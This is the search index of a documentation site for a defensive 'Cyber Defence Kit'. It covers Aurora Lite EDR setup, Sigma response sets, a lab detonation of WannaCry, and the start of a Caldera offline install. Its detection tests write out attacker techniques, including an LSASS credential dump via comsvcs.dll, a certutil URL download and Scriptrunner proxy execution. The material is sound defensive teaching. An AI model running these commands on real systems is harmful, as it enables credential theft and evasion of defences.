{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"index.html","title":"Home","text":""},{"location":"index.html#welcome-to-the-cyber-defence-kit","title":"Welcome to the Cyber Defence Kit","text":""},{"location":"index.html#introduction","title":"Introduction","text":"<p>The Cyber Defence Kit began as a personal exploration of open-source cybersecurity tools and grew into a shared learning resource. Each step was documented through proof-of-concept videos, notes, lessons learned, and practical tips, all shared openly to make these tools more accessible. The goal is to encourage others to explore, implement, and understand open-source cybersecurity solutions.</p> <p></p>"},{"location":"index.html#getting-started","title":"Getting Started","text":"<p>To begin leveraging the Cyber Defence Kit:</p> <ol> <li>Understand the Toolkit:<ul> <li>Familiarise yourself with the components of the kit.</li> </ul> </li> <li>Set Up Your Environment:<ul> <li>Prepare your system by checking the hardware and software requirements before installation.</li> <li>Prepare your systems for installation (e.g., air-gapped environment considerations).</li> </ul> </li> <li>Learn and Explore:<ul> <li>Explore proof of concept videos and documentation on attack simulation.</li> </ul> </li> </ol>"},{"location":"index.html#important-notes","title":"Important Notes","text":"<ul> <li>Security First: Always follow security best practices when installing and configuring tools.</li> <li>Air-Gapped Environments: Special considerations are required for installations without internet access.</li> <li>Legal Compliance: Ensure all activities comply with legal and regulatory requirements.</li> </ul>"},{"location":"index.html#licence","title":"Licence","text":"<p>Cyber Defence Kit documentation is created by Joseph Jee and licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) Licence. You are free to share and adapt the content with proper attribution.</p>"},{"location":"auroralite/auroralite.html","title":"Aurora Lite","text":""},{"location":"auroralite/auroralite.html#aurora-lite","title":"Aurora Lite","text":"<p>Aurora Lite is a free Endpoint Detection and Response (EDR) tool that uses Sigma rules and Indicators of Compromise (IOCs) to detect and respond to threats in real time. It monitors system events through Windows Event Tracing (ETW) and can take automated actions, like suspending harmful processes. Though limited in advanced features, Aurora Lite is a powerful, cost-free solution for basic threat detection and response. Learn more at Nextron Systems.</p>"},{"location":"auroralite/auroralite.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, an attack simulation was conducted on a Windows Virtual Machine (VM) using live WannaCry ransomware within a secure and controlled environment. Aurora Lite was installed on the Windows VM to detect and respond to the attack.</p> <p>Note: Only use malware samples on systems you own and can restore, such as VMs with snapshots. Never execute malware on unauthorised systems. Always follow strict malware handling protocols and ensure simulations are conducted in secure, isolated environments. Do not attempt such activities without proper training and authorisation to avoid legal consequences and potential system damage.</p> Host OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.111 (WAN) / 10.0.0.1 (LAN) WS2019 Windows Server 2019 Aurora Lite 10.0.0.140 <p></p>"},{"location":"auroralite/auroralite.html#download-aurora-lite","title":"Download Aurora Lite","text":"<p>Navigate to https://www.nextron-systems.com/aurora/ and download Aurora Lite.</p> <p></p> <p>Submit your name and email address. It does not have to be your personal email address. </p> <p></p> <p>Check your inbox and confirm you email address.</p> <p></p> <p>Download your license and Aurora Lite. Note you will have to temporarily disable Windows defender to download Aurora Lite. </p> <p></p>"},{"location":"auroralite/auroralite.html#system-requirements","title":"System Requirements","text":"<p>Aurora is compatible with Windows 7 and later versions, but it requires administrator-level permissions to operate.</p> <p>It does not support alternative operating systems like Linux or macOS.</p>"},{"location":"auroralite/auroralite.html#supported-platforms","title":"Supported Platforms","text":"<ul> <li>Windows 7 (32-bit and 64-bit)</li> <li>Windows Server 2008 R2 (64-bit)</li> <li>Windows 8.1</li> <li>Windows Server 2012</li> <li>Windows Server 2012 R2</li> <li>Windows 10</li> <li>Windows 11</li> <li>Windows Server 2016</li> <li>Windows Server 2019</li> <li>Windows Server 2022</li> </ul>"},{"location":"auroralite/auroralite.html#update-servers","title":"Update Servers","text":"<p>An active internet connection is required to download the latest updates for Aurora and its signatures. The endpoint performing the update must have access to our update servers.</p> <p>For the most current and comprehensive list of our update and licensing servers, please visit: https://www.nextron-systems.com/resources/hosts/.</p>"},{"location":"auroralite/auroralite.html#setting-an-antivirus-edr-exclusion","title":"Setting an Antivirus / EDR Exclusion","text":"<p>It is advisable to configure your Antivirus or EDR solution to exclude Aurora. The exclusion paths will depend on your system architecture and whether Aurora was installed or executed interactively from a temporary directory.</p> <p>For an installed version of Aurora:</p> <pre><code>C:\\Program Files\\Aurora-Agent\\aurora-agent-64.exe\nC:\\Program Files\\Aurora-Agent\\aurora-agent.exe\n</code></pre> <p>For an interactively started Aurora, exclude the directory where it was extracted. For instance:</p> <pre><code>C:\\aurora\\aurora-agent-64.exe\nC:\\aurora\\aurora-agent.exe\n</code></pre>"},{"location":"auroralite/auroralite.html#running-aurora","title":"Running Aurora","text":"<p>You can run Aurora from your terminal using default values for each flag without requiring a dedicated configuration file:</p> <pre><code>aurora-agent-64.exe  \n</code></pre> <p>Alternatively, in the directory where Aurora Lite is extracted (e.g. <code>C:\\aurora</code>), double-click <code>aurora-agent-64</code> </p> <p></p> <p>Open PowerShell and run <code>whoami /groups</code></p> <p>Verify that Aurora generates alert <code>Sigma match found</code> with the title <code>Group Membership Reconnaissance via Whoami.EXE</code></p> <p></p> <p>To use a specific configuration preset, include the respective flag:</p> <pre><code>aurora-agent-64.exe -c agent-config-reduced.yml  \n</code></pre> <p>A typical command to run Aurora, which prints messages and matches to the terminal and the Windows Application Event Log, is:</p> <pre><code>aurora-agent-64.exe --minimum-level low  \n</code></pre>"},{"location":"auroralite/auroralite.html#running-aurora-as-a-service","title":"Running Aurora as a Service","text":"<p>To install Aurora as a service, use the <code>--install</code> flag. An example installation on systems with limited hardware resources (i.e. installing Aurora with the reduced preset) looks like this:</p> <pre><code>aurora-agent-64.exe --install -c agent-config-reduced.yml  \n</code></pre> <p>Aurora includes four configuration presets to suit various needs:</p> <ol> <li>Standard: <code>agent-config-standard.yml</code></li> <li>Reduced: <code>agent-config-reduced.yml</code></li> <li>Minimal: <code>agent-config-minimal.yml</code></li> <li>Intense: <code>agent-config-intense.yml</code></li> </ol> <p>The configuration presets have the following settings:</p> Affected Setting Minimal Reduced Standard Intense Deactivated Sources Registry, Raw Disk Access, Kernel Handles, Create Remote Thread, Process Access, Image Loads Registry, Raw Disk Access, Kernel Handles, Create Remote Thread, Process Access Registry, Raw Disk Access, Kernel Handles, Create Remote Thread CPU Limit 20 % 30 % 35 % 100 % Process Priority Low Normal Normal Normal Minimum Reporting Level High High Medium Low Deactivated Modules LSASS Dump Detector, BeaconHunter LSASS Dump Detector <p>Warning: The Intense preset consumes significant system resources and may heavily burden the system, particularly when a process rapidly accesses numerous registry keys.</p> <p>It is recommended to use this preset sparingly, either on a carefully chosen set of systems or in scenarios where maximum detection capability is essential.</p>"},{"location":"auroralite/auroralite.html#installing-aurora","title":"Installing Aurora","text":"<p>Extract the program package into a temporary folder (e.g., <code>C:\\aurora</code>).</p> <p>Place the license file (<code>.lic</code>) into the extracted folder.</p> <p>Open Command Prompt as an Administrator.</p> <p>Navigate to the extracted folder:</p> <pre><code>cd C:\\aurora\n</code></pre> <p>Run one of the following commands to install Aurora (with or without the GUI):</p> <pre><code>aurora-agent.exe --install \naurora-agent.exe --install --dashboard \n</code></pre> <p>After installation, the agent, configuration files, and rules will be located in:</p> <pre><code>C:\\Program Files\\Aurora Agent\\\n</code></pre> <p>All rule files in the <code>signatures\\sigma-rules</code> and <code>custom-signatures</code> subfolders are automatically copied.</p> <ul> <li>The <code>signatures\\sigma-rules</code> folder contains the latest open-source rules from the Sigma repository.</li> <li>The <code>custom-signatures</code> folder can be used to add your own Sigma rules.</li> </ul> <p>Check the local Application Event Log to verify the presence of new events related to the Aurora Agent.</p> <p></p> <p>Navigate to Aurora dashboard <code>http://localhost:17494/ui/dashboard/overview</code> on a web browser and confirm that the Aurora dashboard is accessible. </p> <p></p> <p>To check the current status of the agent, run the following commands:</p> <pre><code>aurora-agent.exe --status\naurora-agent.exe --status --trace\n</code></pre> <p>For testing Aurora\u2019s functionality, refer to the Function Tests section for ideas on validating its performance.</p>"},{"location":"auroralite/auroralite.html#custom-settings","title":"Custom Settings","text":"<p>For instructions on adding your own Sigma rules or Indicators of Compromise (IOCs), refer to the Manual Signature Management section. The recommended approach is to place these custom rules in the <code>custom-signatures</code> folder before installing Aurora.</p> <p>All flags used during installation (following <code>--install</code>) are saved in the configuration file named <code>agent-config.yml</code>, located in:</p> <pre><code>C:\\Program Files\\Aurora Agent\\\n</code></pre> <p>These settings are then applied by the Aurora service.</p> <p>A typical installation command with custom settings might look like this:</p> <pre><code>aurora-agent.exe --install --activate-responses\n</code></pre>"},{"location":"auroralite/auroralite.html#manual-signature-management","title":"Manual Signature Management","text":"<p>Signatures can be defined when starting Aurora by using the <code>--rules-path</code> and <code>--ioc-path</code> parameters. By default, these parameters point to:</p> <ul> <li>Built-in rules and IOCs: <code>signatures\\sigma-rules</code> and <code>signatures\\iocs</code></li> <li>Custom rules and IOCs: <code>custom-signatures\\sigma-rules</code> and <code>custom-signatures\\iocs</code></li> </ul> <p>Aurora will recursively traverse the specified directories and load all signature files it finds.</p> <p>To add new Sigma rules or IOCs, you can either:</p> <ol> <li>Place them in the appropriate subfolder within <code>custom-signatures</code>.</li> <li>Specify their location directly using the <code>-rules-path</code> or <code>-ioc-path</code> parameters.</li> </ol> <p>Warning: When using <code>--rules-path</code> or <code>--ioc-path</code>, if you wish to include Aurora\u2019s built-in rules and IOCs, you must explicitly add their paths as well. For example:</p> <pre><code>aurora-agent.exe --install --rules-path .\\signatures\\sigma-rules --rules-path .\\my-rules\n</code></pre> <p>If custom paths are configured, only the specified paths will be used.</p>"},{"location":"auroralite/auroralite.html#uninstalling-aurora","title":"Uninstalling Aurora","text":"<p>To uninstall the Aurora agent, simply execute the following command in an administrative terminal:</p> <pre><code>aurora-agent.exe --uninstall\n</code></pre> <p>If the uninstaller encounters errors and fails, you can manually remove Aurora using these commands:</p> <ol> <li> <p>Stop the Aurora service:</p> <pre><code>sc stop aurora-agent\n</code></pre> </li> <li> <p>Delete the service:</p> <pre><code>sc delete aurora-agent\n</code></pre> </li> <li> <p>Remove the program files:</p> <pre><code>rmdir /s /q \"C:\\Program Files\\Aurora-Agent\"\n</code></pre> </li> <li> <p>Delete scheduled tasks:</p> <pre><code>schtasks /Delete /F /TN aurora-agent-program-update\nschtasks /Delete /F /TN aurora-agent-signature-update\n</code></pre> </li> </ol>"},{"location":"auroralite/auroralite.html#responses","title":"Responses","text":"<p>Responses in Aurora agents are an enhancement to the Sigma standard. They enable the agent to take specific actions when a Sigma rule is matched, providing an immediate response to identified events. This functionality can be effective in containing threats or minimising potential damage. However, improper use can cause significant issues.</p> <p>Caution:</p> <p>Responses should only be applied in scenarios where you are completely confident that the rule will not trigger false positives. Custom actions must be thoroughly tested before deployment.</p> <p>Intended Use Cases:</p> <ul> <li>Containing worm outbreaks</li> <li>Ransomware mitigation</li> <li>Enforcing strict blocking of specific tool usage (for broader control, consider using AppLocker).</li> </ul>"},{"location":"auroralite/auroralite.html#types-of-actions","title":"Types of Actions","text":"<p>The Aurora agent supports two categories of responses:</p> <ul> <li>Predefined</li> <li>Custom</li> </ul> <p>Actions can include a predefined set of responses or custom commands, as illustrated below.</p>"},{"location":"auroralite/auroralite.html#predefined-responses","title":"Predefined Responses","text":"<ul> <li><code>suspend</code>: Temporarily suspends the target process.</li> <li><code>kill</code>: Terminates the target process.</li> <li><code>dump</code>: Generates a dump file in the folder specified by the <code>dump-path</code> configuration.</li> </ul>"},{"location":"auroralite/auroralite.html#response-flags","title":"Response Flags","text":"<p>Responses in Aurora can be customised using various flags defined in the YAML configuration as key-value pairs. The available response flags are as follows:</p> <p>Simulate</p> <p>The <code>simulate</code> flag ensures that no response is triggered upon a match. Instead, a log entry is created to indicate which response would have been executed. This mimics the behaviour when <code>--activate-responses</code> is not set.</p> <ul> <li>Supported for all responses.</li> </ul> <p>Recursive</p> <p>The <code>recursive</code> flag extends the response to include all child and descendant processes of the targeted process.</p> <ul> <li>Supported for predefined responses.</li> <li>Default value: <code>true</code>.</li> </ul> <p>Low Privilege Only</p> <p>The <code>lowprivonly</code> flag ensures that a response is triggered only if the target process is not running as <code>LOCAL SYSTEM</code> or another elevated privilege.</p> <ul> <li>Supported for predefined responses.</li> <li>Default value: <code>true</code>.</li> </ul> <p>Ancestor</p> <p>The <code>ancestors</code> flag allows the response to target an ancestor of the process instead of the process itself.</p> <ul> <li><code>ancestors: 1</code> targets the parent process.</li> <li><code>ancestors: 2</code> targets the grandparent process, and so on.</li> <li><code>ancestors: all</code> applies the response to all ancestors up to the first invalid ancestor (determined by the <code>lowprivonly</code> flag).</li> <li>Supported for predefined responses.</li> <li>Default value: <code>0</code> (no ancestor targeted).</li> </ul> <p>Process ID Field</p> <p>The <code>processidfield</code> flag specifies the field containing the process ID of the target process.</p> <ul> <li>Supported for predefined responses.</li> <li>Default value: <code>ProcessId</code>.</li> </ul>"},{"location":"auroralite/auroralite.html#specifying-a-response-for-a-sigma-rule","title":"Specifying a Response for a Sigma Rule","text":"<p>Aurora allows responses to be defined for Sigma rules in two ways, each with its own benefits and drawbacks.</p>"},{"location":"auroralite/auroralite.html#inline-responses","title":"Inline Responses","text":"<p>Responses can be embedded directly within a Sigma rule.</p> <ul> <li>Advantages:<ul> <li>Useful for testing purposes.</li> <li>Keeps the response and rule in a single file for simplicity.</li> </ul> </li> <li>Disadvantages:<ul> <li>Less flexible since the same response will be active on all systems where the rule is deployed.</li> <li>Difficult to list all active responses.</li> </ul> </li> </ul> <p>Example of a Sigma Rule with Inline Response:</p> <pre><code>title: Example rule with inline response  \nlogsource:  \n   product: windows  \n   category: process_creation  \ndetection:  \n   selection:  \n      Image|endswith: '\\example.exe'  \n   condition: selection  \nresponse:  \n   type: predefined  \n   action: kill  \n</code></pre>"},{"location":"auroralite/auroralite.html#response-sets","title":"Response Sets","text":"<p>Responses can also be defined in a separate response set file.</p> <ul> <li>Advantages:<ul> <li>Allows centralised management of responses.</li> <li>Responses can be customised for specific systems or environments.</li> <li>Easier to update and track active responses.</li> </ul> </li> <li>Usage:<ul> <li>A response set file includes a response definition and a list of rule IDs to which the response applies.</li> <li>Multiple response set files can be provided during startup using the <code>-response-set</code> option.</li> </ul> </li> <li>Priority:<ul> <li>If a rule has responses defined inline and in response sets, the response from the last-specified response set takes precedence.</li> </ul> </li> </ul> <p>Example of a Response Set File:</p> <pre><code>description: My example response set  \nresponse:  \n   type: predefined  \n   action: kill  \n   lowprivonly: true  \n   ancestors: all  \nrule-ids:  \n   - '87df9ee1-5416-453a-8a08-e8d4a51e9ce1'  # Delete Volume Shadow Copies Via WMI  \n   - 'ae9c6a7c-9521-42a6-915e-5aaa8689d529'  # CobaltStrike Load by Rundll32  \n</code></pre>"},{"location":"auroralite/auroralite.html#introduction-to-aurora-lite","title":"Introduction to Aurora Lite","text":""},{"location":"auroralite/auroralite.html#performing-function-tests","title":"Performing Function Tests","text":"<p>There are straightforward methods to test Aurora and confirm its ability to detect suspicious or malicious events.</p>"},{"location":"auroralite/auroralite.html#sigma-matching-process-creation","title":"Sigma Matching - Process Creation","text":"<p>Included in profiles: Minimal, Reduced, Standard, Intense</p> <p>This should create a\u00a0<code>warning</code>\u00a0level message for a Sigma rule with level\u00a0<code>high</code>.</p> <pre><code>whoami /priv\n</code></pre> <p></p> <p>This should create a\u00a0<code>warning</code>\u00a0level message for a Sigma rule with level\u00a0<code>high</code>.</p> <pre><code>certutil.exe -urlcache http://test.com\n</code></pre> <p>This actually created a <code>notice</code> level message with level <code>medium</code> on Windows Server 2019</p> <p></p>"},{"location":"auroralite/auroralite.html#sigma-matching-network-communication","title":"Sigma Matching - Network Communication","text":"<p>Included in profiles: Minimal, Reduced, Standard, Intense</p> <p>This should create an\u00a0<code>alert</code>\u00a0level message for a Sigma rule with level\u00a0<code>critical</code>.</p> <pre><code>ping aaa.stage.123456.test.com\n</code></pre> <p></p>"},{"location":"auroralite/auroralite.html#sigma-matching-file-creation","title":"Sigma Matching - File Creation","text":"<p>Included in profiles: Minimal, Reduced, Standard, Intense</p> <p>This should create a\u00a0<code>warning</code>\u00a0level message for a Sigma rule with level\u00a0<code>high</code>.</p> <pre><code>echo \"test\" &gt; %temp%\\lsass.dmp\n</code></pre> <p></p>"},{"location":"auroralite/auroralite.html#sigma-matching-process-access","title":"Sigma Matching - Process Access","text":"<p>Included in profiles: Standard, Intense</p> <p>This should create a\u00a0<code>warning</code>\u00a0level message for a Sigma rule with level\u00a0<code>high</code>.</p> <pre><code>#PowerShell\n$id = Get-Process lsass; rundll32.exe C:\\Windows\\System32\\comsvcs.dll , MiniDump $id.Id $env:temp\\lsass.dmp full\n</code></pre> <p></p> <p>Cleanup:</p> <pre><code>Remove-Item \"$env:temp\\lsass.dmp\" -Force\n</code></pre>"},{"location":"auroralite/auroralite.html#sigma-matching-registry","title":"Sigma Matching - Registry","text":"<p>Included in profiles: Intense</p> <p>This should create a\u00a0<code>warning</code>\u00a0level message for a Sigma rule with level\u00a0<code>high</code>.</p> <pre><code>reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AuroraTest\" /V \"AuroraTest\" /t REG_SZ /F /D \"vbscript\"\n</code></pre> <p>This did not generate any alert on Windows Server 2019 despite using the Intense preset.</p> <p>Cleanup:</p> <pre><code>reg delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AuroraTest\" /F\n</code></pre>"},{"location":"auroralite/auroralite.html#ioc-matching-filenames","title":"IOC Matching - Filenames","text":"<p>This should create a\u00a0<code>notice</code> level message for a Sigma rule with the name filename IOC match found. </p> <pre><code>echo \"test\" &gt; \"$env:TEMP\\loader.ps1\"\n</code></pre> <p></p> <p>Cleanup:</p> <pre><code>del $env:TEMP\\loader.ps1\n</code></pre>"},{"location":"auroralite/auroralite.html#ioc-matching-c2","title":"IOC Matching - C2","text":"<p>This should create a\u00a0<code>alert</code> level message for a Sigma rule with the name C2 IOC match found. </p> <pre><code>ping drivers-update.info\n</code></pre> <p></p>"},{"location":"auroralite/auroralite.html#ioc-matching-named-pipe","title":"IOC Matching - Named Pipe","text":"<p>Start a named pipe using the following PowerShell commands:</p> <pre><code>$npipeServer = New-Object System.IO.Pipes.NamedPipeServerStream('testPipe', [System.IO.Pipes.PipeDirection]::InOut)\n$npipeServer.Close()\n</code></pre> <p>This should create a\u00a0<code>alert</code> level message for a Sigma rule with the title Malicious Named Pipe Created. </p> <p></p> <p>Included in profiles: Intense</p>"},{"location":"auroralite/auroralite.html#ioc-matching-mutex","title":"IOC Matching - Mutex","text":"<p>Create a mutex using the following PowerShell commands:</p> <pre><code>$mtx = New-Object System.Threading.Mutex($true, \"agony\")\n</code></pre> <p>Matching might take some time (outside of the Intense profile) since mutexes are polled.</p> <p>This did not generate any alert on Windows Server 2019 despite using the Intense preset. ****</p> <p>Note: The Aurora Lite version uses only a very limited set of IOCs.</p>"},{"location":"auroralite/auroralite.html#living-off-the-land-binaries-and-scripts-lolbas","title":"Living Off the Land Binaries and Scripts (LOLBAS)","text":"<p>LOLBAS (Living Off the Land Binaries and Scripts) refers to using legitimate, pre-installed tools and utilities on a system to perform potentially malicious actions while evading detection by security systems. </p> <p>In this case, <code>Scriptrunner.exe</code> is a legitimate utility that is being used as a \"proxy\" to indirectly execute another program (<code>calc.exe</code>). This technique helps bypass security measures that might flag or block direct execution of certain programs, as the execution appears to originate from a trusted utility. This approach requires only basic user privileges and works on various versions of Windows.</p> <p>Run the following command: </p> <pre><code>Scriptrunner.exe -appvscript calc.exe\n</code></pre> <p>This should create a\u00a0<code>notice</code>\u00a0level message for a Sigma rule with level\u00a0<code>medium</code>.</p> <p></p>"},{"location":"auroralite/auroralite.html#activating-response-sets","title":"Activating Response Sets","text":""},{"location":"auroralite/auroralite.html#suspending-notepad-process","title":"Suspending Notepad Process","text":"<p>The objective is to verify that Aurora Lite can suspend a simple process.</p> <p>Create a simple Sigma rule to detect Notepad. Save the following Sigma rule as <code>proc_creation_notepad.yml</code> in <code>C:\\aurora\\custom-signatures\\sigma-rules</code>:</p> <pre><code>title: Detect Notepad Execution\nid: test-notepad-rule\nstatus: test\ndescription: Detects when notepad.exe is started.\ntags:\n    - testing\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\notepad.exe'\n    condition: selection\nfalsepositives:\n    - None\nlevel: medium\n</code></pre> <p>Create a response set to suspend the Notepad process. Save the following response set as <code>test_notepad.yml</code> in <code>C:\\aurora\\response-sets</code>:</p> <pre><code>description: Suspend Notepad process for testing\nresponse:\n    type: predefined\n    action: suspend\n    lowprivonly: false\n    ancestors: 0\n    recursive: false\nrule-ids:\n    - 'test-notepad-rule'\n</code></pre> <p>Install and activate your <code>test_notepad.yml</code> response set using Aurora Lite:</p> <pre><code>aurora-agent.exe --install --response-set c:\\aurora\\response-sets\\test_notepad.yml --activate-responses\n</code></pre> <p></p> <p>Ensure <code>test_notepad.yml</code> is located in <code>C:\\Program Files\\Aurora-Agent\\response-sets</code> and <code>proc_creation_notepad.yml</code> is in <code>C:\\Program Files\\Aurora-Agent\\custom-signatures\\sigma-rules</code>.</p> <p>Next, open Task Manager and Notepad. Verify that Notepad (notepad.exe) is instantly suspended.</p> <p></p>"},{"location":"auroralite/auroralite.html#detonating-wannacry-ransomware","title":"Detonating WannaCry Ransomware","text":"<p>The WannaCry Ransomware sample is available from this GitHub repository, which hosts live malware samples designed for the Practical Malware Analysis &amp; Triage (PMAT) course.</p> <p>The repository includes both real-world malware captured in the wild and samples crafted to mimic typical malware behaviour. These are highly dangerous and require careful handling.</p> <p>Important precautions:</p> <ul> <li>Only download or run these samples on machines you own.</li> <li>Always use a virtual machine with snapshots to ensure the system can be restored to a clean state.</li> <li>Follow strict malware safety protocols while working with these samples.</li> </ul> <p>Create a snapshot of the system in its pre-detonation state, ensuring the internet connection is disabled. Copy the file <code>cosmo.jpeg</code> to the desktop before proceeding. Execute the WannaCry ransomware and monitor its behaviour.</p> <p>Initially, you will observe processes such as <code>Ransomware.wannacry.exe</code>, <code>taskhsvc.exe</code>, and <code>tasksche.exe</code> running in Task Manager. After a short time, the process <code>@WanaDecryptor@.exe</code> will also appear. Key symptoms of the infection include:</p> <ul> <li>The desktop wallpaper changes.</li> <li>A program window opens, displaying a countdown timer, ransom demand, and payment options.</li> <li>Files on the system are encrypted with the <code>.WNCRY</code> extension.</li> <li>Two new files appear on the desktop: <code>@WanaDecryptor@</code> (executable) and <code>@Please_Read_Me@</code> (text file).</li> </ul> <p>After completing your observations, revert the system to its pre-detonation snapshot to restore its original state.</p> <p></p> <p></p> <p></p>"},{"location":"auroralite/auroralite.html#suspending-wannacry-processes","title":"Suspending WannaCry Processes","text":"<p>Create a Sigma Rule and Response Set for WannaCry</p> <p>Create a Sigma rule to detect the WannaCry Ransomware. Save the following Sigma rule as <code>proc_creation_wannacry.yml</code> in <code>C:\\aurora\\custom-signatures\\sigma-rules</code>:</p> <pre><code>title: Detect WannaCry Processes\nid: wannacry-detection-rule\nstatus: test\ndescription: Detects processes associated with WannaCry ransomware.\ntags:\n    - ransomware\n    - wannacry\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\taskhsvc.exe'\n            - '\\tasksche.exe'\n    condition: selection\nfalsepositives:\n    - None\nlevel: high\n</code></pre> <p>Create a response set to suspend WannaCry processes. Save the following response set as <code>suspend_wannacry.yml</code> in <code>C:\\aurora\\response-sets</code>:</p> <pre><code>description: Suspend WannaCry processes for testing and containment\nresponse:\n    type: predefined\n    action: suspend\n    lowprivonly: false\n    ancestors: 0\n    recursive: false\nrule-ids:\n    - 'wannacry-detection-rule'\n</code></pre> <p>Note: The suspend action temporarily halts the targeted process, while the kill action terminates it. For demonstration purposes, we used suspend since it allows you to visually verify the process status in Task Manager. In a real-world scenario, the kill action would typically be more appropriate to immediately neutralise the threat.</p> <p>Use the Aurora Lite agent to install and activate the response set with the following command:</p> <pre><code>aurora-agent.exe --install --response-set c:\\aurora\\response-sets\\suspend_wannacry.yml --activate-responses\n</code></pre> <p>Ensure the following:</p> <ul> <li><code>suspend_wannacry.yml</code> is located in <code>C:\\Program Files\\Aurora-Agent\\response-sets</code>.</li> <li><code>proc_creation_wannacry.yml</code> is located in <code>C:\\Program Files\\Aurora-Agent\\custom-signatures\\sigma-rules</code>.</li> </ul> <p>Execute the WannaCry ransomware, ensuring the internet is disconnected. </p> <p>Open Task Manager and verify that the <code>tasksche.exe</code> process is suspended. Please note that it may take some time for the <code>tasksche.exe</code> process to appear as suspended in Task Manager.</p> <p></p> <p>Verify that a Sigma rule match is identified for WannaCry ransomware activity in the Windows Event Log under the Application category.</p> <p></p> <p>Revert the VM to its pre-detonation snapshot to remove any changes made by WannaCry ransomware.</p>"},{"location":"auroralite/auroralite.html#references","title":"References","text":"<ul> <li>https://aurora-agent-manual.nextron-systems.com/en/latest/index.html</li> <li>https://youtu.be/R3fFzYXKn3c?si=ztsyE9ee99DWL0MQ</li> <li>https://youtu.be/ExVpIwvEihA?si=tGiE90181bGSfXI-</li> <li>https://github.com/SigmaHQ/sigma</li> <li>https://github.com/HuskyHacks/PMAT-labs</li> </ul>"},{"location":"caldera/caldera.html","title":"Caldera","text":""},{"location":"caldera/caldera.html#caldera","title":"Caldera","text":"<p>Caldera is a cybersecurity platform designed to automate adversary emulation, support red team operations, and streamline incident response.</p> <p>Built on the MITRE ATT&amp;CK framework, Caldera is an ongoing research project at MITRE. It consists of two key components:</p> <ol> <li>Core System \u2013 The main framework, available in this repository, includes an asynchronous command-and-control (C2) server with a REST API and a web interface.</li> <li>Plugins \u2013 Extend the framework\u2019s capabilities, adding functionality such as agents, reporting, and collections of TTPs.</li> </ol>"},{"location":"caldera/caldera.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, an attack simulation was conducted on Ubuntu and Windows virtual machines (VMs) within a secure and controlled environment. Caldera was installed on the Ubuntu VM to automate adversary emulation.</p> <p>Note: Do not attempt to replicate the attack emulation demonstrated here unless you are properly trained and it is safe to do so. Unauthorised attack emulation can result in legal consequences and unintended damage to systems. Always ensure that such activities are carried out by qualified professionals in a secure, isolated environment.</p> Host OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.10 (WAN) / 10.0.0.1 (LAN) Caldera Ubuntu 24.04 Caldera Server 10.0.0.100 Ubuntu Ubuntu 24.04 Caldera Linux Agent 10.0.0.200 WS2019 Windows Server 2019 Caldera Windows Agent 10.0.0.50 <p></p>"},{"location":"caldera/caldera.html#installing-caldera","title":"Installing Caldera","text":"<p>You can install Caldera in just four commands by following the simplified installation steps. Alternatively, it can be set up and run using a Docker container.</p>"},{"location":"caldera/caldera.html#system-requirements","title":"System Requirements","text":"<p>Caldera is designed to work across various target systems. The key requirements are as follows:</p> <ul> <li>Operating System: Linux or macOS</li> <li>Python: Version 3.8 or newer (with pip3)</li> <li>NodeJS: Version 16 or newer (required for Caldera v5)</li> <li>Browser: A modern option, such as Google Chrome (recommended)</li> <li>Packages: As specified in the requirements file</li> </ul>"},{"location":"caldera/caldera.html#recommended-setup","title":"Recommended Setup","text":"<p>For a development environment and to enable dynamic agent compilation, the following are advised:</p> <ul> <li>GoLang: Version 1.17 or newer (for enhanced agent functionality)</li> <li>Hardware: At least 8GB of RAM and 2 CPUs</li> <li>Packages: As specified in the dev requirements file</li> </ul>"},{"location":"caldera/caldera.html#installing-caldera-offline-ubuntu","title":"Installing Caldera Offline (Ubuntu)","text":"<p>The documentation outlines the steps for installing MITRE Caldera offline on Ubuntu 24.04.</p>"},{"location":"caldera/caldera.html#on-an-internet-connected-machine","title":"On an Internet-Connected Machine","text":"<p>On an internet-connected machine, refresh the package lists from the repositories and create a structured directory for downloading dependencies:</p> <pre><code>sudo apt-get update\nmkdir -p ~/caldera-offline/{vmtools,pip3,chrome,curl,jq,upx,git,nodejs,nodejs/npm,node-modules,magma-dist,go,go-modules}\n</code></pre> <p>Download and install VM tools and its dependencies (this will enable copy and pasting and dynamic resolution). </p> <pre><code>cd ~/vmtools\napt-get download \\\n  libatkmm-1.6-1v5 \\\n  libcairomm-1.0-1v5 \\\n  libglibmm-2.4-1t64 \\\n  libgtkmm-3.0-1t64 \\\n  libmspack0t64 \\\n  libpangomm-1.4-1v5 \\\n  libsigc++-2.0-0v5 \\\n  libxmlsec1t64 \\\n  libxmlsec1t64-openssl \\\n  open-vm-tools \\\n  open-vm-tools-desktop \\\n  zerofree\nsudo dpkg -i *.deb\n</code></pre> <p>After installing VM tools, you may need to reboot the VM if copy and pasting does not work. </p> <p>Download Python3-pip and its dependencies (required to run <code>pip3 download</code>). </p> <pre><code>cd ~/caldera-offline/pip3\napt-get download python3-pip python3-setuptools python3-wheel ca-certificates python3 \\\n    python3-pkg-resources python3-minimal python3.12 libpython3-stdlib \\\n    openssl debconf cdebconf python3-venv python3-tk python3-doc \\\n    libdebian-installer4 libtextwrap1 python3.12-doc blt libtk8.6 tk8.6-blt2.5 python3.12-venv \\\n    libc6 libtcl8.6 libfontconfig1 libx11-6 libxft2 libxss1 libjs-jquery libjs-underscore \\\n    python3-pip-whl python3-setuptools-whl\n</code></pre> <p>Install the packages in the following order. Verify Python3-pip installation. </p> <pre><code>sudo dpkg -i python3-minimal_3.12.3-0ubuntu2_amd64.deb\nsudo dpkg -i libpython3-stdlib_3.12.3-0ubuntu2_amd64.deb\nsudo dpkg -i python3_3.12.3-0ubuntu2_amd64.deb\nsudo dpkg -i *.deb\npip3 --version\n</code></pre> <p>If you encounter the warning related to permission issue, simply run the <code>sudo apt-get download &lt;SNIP&gt;</code> command again to 